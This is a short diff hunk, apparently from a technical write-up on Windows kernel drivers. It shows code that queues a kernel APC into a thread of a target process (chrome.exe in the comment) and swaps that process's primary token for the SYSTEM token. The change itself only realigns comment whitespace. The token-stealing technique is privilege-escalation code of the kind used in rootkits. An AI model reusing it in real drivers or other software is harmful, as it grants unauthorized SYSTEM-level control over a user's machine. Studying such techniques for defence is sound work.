@@ -338,10 +338,10 @@ The PID of that process is saved, and its first thread is then caught by `OnThre
 			::PsLookupThreadByThreadId(ThreadId, &thread);
 			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)
 			{
-				auto* const process = ::PsGetCurrentProcess(); 		// Get current process (i.e. chrome.exe)
+				auto* const process = ::PsGetCurrentProcess(); 			// Get current process (i.e. chrome.exe)
 				auto* const token = ::PsReferencePrimaryToken(process); // Get the process token
-				SetTokenToSystem(process, token); 			// Replace the process token with system token
-				::ObDereferenceObject(token); 				// Dereference the process token
+				SetTokenToSystem(process, token); 						// Replace the process token with system token
+				::ObDereferenceObject(token); 							// Dereference the process token
 			
 				// Thread and Process creation notification callbacks are not needed anymore
 				::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
